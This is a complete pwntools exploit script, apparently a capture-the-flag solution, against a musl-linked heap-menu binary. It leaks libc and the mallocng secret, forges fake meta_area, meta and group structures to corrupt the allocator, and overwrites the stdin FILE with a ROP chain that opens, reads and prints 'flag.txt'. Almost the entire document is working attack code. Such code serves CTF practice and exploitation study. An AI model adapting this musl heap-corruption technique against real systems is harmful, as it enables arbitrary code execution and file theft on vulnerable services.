#!/usr/bin/env python3

from pwn import *

exe = ELF('./chall')
libc = ELF('./lib/libc.musl-x86_64.so.1')

context.binary = exe

host = args.HOST or 'localhost'
port = args.PORT or 31240

def local():
  return process(['chroot', '.', '/chall'], env={}) # pepega

def conn():
  if args.LOCAL:
    return local()
  else:
    return remote(host, port)

def debug():
  if args.LOCAL:
    gdb.attach(r, gdbscript=gdbscript)
    pause()

gdbscript = f'''
file {exe.path}
tele &slots 16
'''

r = conn()

# good luck pwning :)

def malloc(idx, size, content):
  r.sendlineafter(b'choice? ', b'1')
  r.sendlineafter(b'idx? ', str(idx).encode('utf-8'))
  r.sendlineafter(b'size? ', str(size).encode('utf-8'))
  r.sendafter(b'content? ', content)

def free(idx):
  r.sendlineafter(b'choice? ', b'2')
  r.sendlineafter(b'idx? ', str(idx).encode('utf-8'))

def view(idx):
  r.sendlineafter(b'choice? ', b'3')
  r.sendlineafter(b'idx? ', str(idx).encode('utf-8'))

malloc(0, 16, b'a')
malloc(1, 64, b'a')
for i in range(5):
  malloc(i + 2, 16, b'a')
free(0)
free(2)

# set length to 100 to leak a bunch of stuff
malloc(7, 16, p64(100))
view(2)
libc.address = u64(r.recv(48)[-8:]) - 0x97ce0
log.info(f'libc: 0x{libc.address:x}')
log.info(f'stdin: 0x{libc.sym["__stdin_FILE"]:x}')
fake_area_add = libc.address - 0x22000
log.info(f'structs page: 0x{fake_area_add:x}')

# leak secret check value from ctx
malloc(8, 16, flat([8, libc.sym['__malloc_context']]))
view(0)
secret = u64(r.recv(8))
log.info(f'secret: 0x{secret:x}')

# set buf pointer to fake chunk
free(7)
malloc(7, 16, flat([0x420, fake_area_add + 0x70]))

# make fake meta_area, meta, group, slot
fake_area = flat([secret, 0, 1, 0])
fake_meta = flat([0, 0, fake_area_add + 0x50, 0, 0x422, 0])
fake_group = flat([fake_area_add + 0x20, 0, 0, 0x0001000000000000])
big = flat([fake_area, fake_meta, fake_group])
# meta_area needs to be at start of page
malloc(10, 8192, b'\0' * 0xfd0 + big)

# free fake chunk, inject fake meta
free(2)

# change meta mem pointer
fake_meta = flat([fake_area_add + 0x20, fake_area_add + 0x20, libc.sym['__stdin_FILE'] - 0x30, 0x0000000100000000, 0x422, 0])
big = flat([fake_area, fake_meta, fake_group])
free(10)
malloc(10, 8192, b'\0' * 0xfc0 + big)

# overwrite stdin with ROP chain
based_gadget = libc.address + 0x4635d
ret = libc.address + 0x15280
rax = libc.address + 0x16d20
rdi = libc.address + 0x15c67
rsi = libc.address + 0x162bd
rdx = libc.address + 0x162fb
syscall = libc.address + 0x20139

payload = flat([0, 0, b'flag.txt', 0, 0x49, 0, 0, libc.sym['__stdio_close'], 0, 0, libc.sym['__stdin_FILE'] + 0x50, ret, 0, based_gadget, [
  rdi, libc.sym['__stdin_FILE'] - 0x10, rsi, 0, rdx, 0, rax, 0, rax, constants.SYS_open, syscall,
  rdi, 3, rsi, libc.sym['__stdin_FILE'], rdx, 128, rax, constants.SYS_read, syscall,
  rdi, constants.STDOUT_FILENO, rsi, libc.sym['__stdin_FILE'], rdx, 128, rax, constants.SYS_write, syscall,
]])
malloc(11, 570, payload)
# debug()
r.sendlineafter(b'choice? ', b'4')

r.stream()
